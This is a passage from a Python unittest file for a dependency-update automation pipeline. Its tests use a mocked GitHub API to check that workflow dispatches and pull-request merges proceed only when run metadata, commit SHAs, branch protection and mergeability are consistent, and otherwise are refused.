        self.assertEqual(self.fixture.mutations, [('POST', '/actions/workflows/dependency-update.yml/dispatches', {
            'ref': 'main', 'inputs': {'pr_number': '1', 'head_sha': SHA, 'base_sha': BASE, 'source_sha': BASE}})])
        self.assertFalse(any(path.startswith('/pulls/2') for path in self.reads))

    def test_first_invalid_candidate_is_skipped_and_only_next_valid_one_is_requested(self):
        original = self.transport
        def transport(method, path, body):
            result = original(method, path, body)
            if method == 'GET' and path.split('?')[0] == '/pulls/1':
                result['head']['sha'] = 'd' * 40
            return result
        self.api = github.GitHub('owner/repo', transport=transport)
        self.discover()
        self.assertEqual(len(self.fixture.mutations), 1)
        self.assertEqual(self.fixture.mutations[0][2]['inputs']['pr_number'], '2')

    def test_completed_historical_run_does_not_block_a_new_candidate(self):
        self.runs = [dict(self.active(), status='completed', conclusion='success',
                          head_sha='d' * 40, display_title='Dependency PR 9 ' + SHA + ' ' + 'd' * 40)]
        self.discover()
        self.assertEqual(len(self.fixture.mutations), 1)

    def test_coherent_old_source_active_run_is_benign_busy_after_merge(self):
        self.runs = [dict(self.active('in_progress'), head_sha='d' * 40,
                          display_title='Dependency PR 9 ' + SHA + ' ' + 'd' * 40)]
        # Current main and discovery source are BASE; the active approval keeps
        # its old source. Its consistent title/head identifies normal deployment.
        self.discover()
        self.assertEqual(self.fixture.mutations, [])
        self.assertFalse(any(path.startswith('/pulls') for path in self.reads))

    def test_all_inventory_rows_foreign_sources_and_incomplete_metadata_are_refused(self):
        for field, value in [('path', '.github/workflows/other.yml'), ('head_sha', SHA),
                             ('head_branch', 'foreign'), ('event', 'push'),
                             ('run_attempt', 2), ('status', 'unknown'),
                             ('display_title', 'Dependency PR 9 ' + SHA + ' ' + SHA),
                             ('display_title', None), ('status', []), ('id', True)]:
            with self.subTest(field=field):
                self.setUp()
                self.runs = [self.active(), dict(self.active(), id=21, **{field: value})] if field != 'id' else [dict(self.active(), id=value)]
                with self.assertRaises(policy.Refused):
                    self.discover()
                self.assertEqual(self.fixture.mutations, [])
        self.setUp()
        self.runs = [self.active(), self.active()]
        with self.assertRaises(policy.Refused):
            self.discover()
        self.setUp()
        missing = self.active()
        del missing['status']
        self.runs = [missing]
        with self.assertRaises(policy.Refused):
            self.discover()

    def test_missing_or_truncated_total_never_dispatches(self):
        for response in ({'workflow_runs': []}, {'workflow_runs': [], 'total_count': 1}):
            with self.subTest(response=response):
                self.inventory = response
                with self.assertRaises(policy.Refused):
                    self.discover()
                self.assertEqual(self.fixture.mutations, [])

    def test_stale_discovery_source_and_new_active_run_before_post_are_refused(self):
        with patch.dict(os.environ, {'GITHUB_SHA': SHA}), self.assertRaises(policy.Refused):
            pipeline.discover(self.api)
        self.assertEqual(self.fixture.mutations, [])
        self.setUp()
        original = self.transport
        inventories = 0
        def transport(method, path, body):
            nonlocal inventories
            if method == 'GET' and path.startswith('/actions/workflows/dependency-update.yml/runs'):
                inventories += 1
                if inventories >= 3:  # initial check, dedupe, pre-dispatch check
                    self.runs = [self.active()]
            return original(method, path, body)
        self.api = github.GitHub('owner/repo', transport=transport)
        self.discover()
        self.assertEqual(self.fixture.mutations, [])

    def test_main_changes_before_dispatch_without_weakening_candidate_base_guard(self):
        original = self.transport
        main_reads = 0
        def transport(method, path, body):
            nonlocal main_reads
            if method == 'GET' and path.split('?')[0] == '/git/ref/heads/main':
                main_reads += 1
                if main_reads >= 3:
                    return {'object': {'sha': 'd' * 40}}
            return original(method, path, body)
        self.api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaisesRegex(policy.Refused, 'Main advanced during dependency discovery'):
            self.discover()
        self.assertEqual(self.fixture.mutations, [])

    def test_lost_approval_dispatch_acknowledgement_has_no_second_post(self):
        original = self.transport
        def transport(method, path, body):
            if method == 'POST':
                self.fixture.mutations.append((method, path, body))
                raise TimeoutError('controlled lost acknowledgement')
            return original(method, path, body)
        self.api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaises(github.Ambiguous):
            self.discover()
        self.assertEqual(len(self.fixture.mutations), 1)


class MergeabilityTests(unittest.TestCase):
    def test_merge_consumes_only_current_protected_mergeable_candidate(self):
        calls = []
        pr = {'state': 'open', 'merged': False, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
        def transport(method, path, body):
            calls.append((method, path, body))
            if method == 'PUT': return {'merged': True, 'sha': 'c' * 40}
            if path == '/pulls/1': return dict(pr)
            return {'commit': {'sha': BASE}, 'protected': True}
        api = github.GitHub('owner/repo', transport=transport)
        self.assertEqual(pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE}), 'c' * 40)
        self.assertEqual([c[0] for c in calls], ['GET', 'GET', 'PUT'])
        self.assertEqual(calls[-1][2]['sha'], SHA)

    def test_stale_unprotected_conflicted_or_unknown_merge_state_never_puts(self):
        for condition in ['head', 'base', 'main', 'protected', 'mergeable', 'mergeable_state', 'blocked']:
            with self.subTest(condition=condition):
                calls = []
                pr = {'state': 'open', 'merged': False, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
                branch = {'commit': {'sha': BASE}, 'protected': True}
                if condition == 'head': pr['head']['sha'] = 'd' * 40
                if condition == 'base': pr['base']['sha'] = 'd' * 40
                if condition == 'main': branch['commit']['sha'] = 'd' * 40
                if condition == 'protected': branch['protected'] = False
                if condition == 'mergeable': pr['mergeable'] = None
                if condition == 'mergeable_state': pr['mergeable_state'] = 'unknown'
                if condition == 'blocked': pr['mergeable_state'] = 'blocked'
                def transport(method, path, body):
                    calls.append(method)
                    return pr if path == '/pulls/1' else branch
                api = github.GitHub('owner/repo', transport=transport)
                with self.assertRaises(policy.Refused):
                    pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE})
                self.assertNotIn('PUT', calls)


if __name__ == '__main__':
    unittest.main()
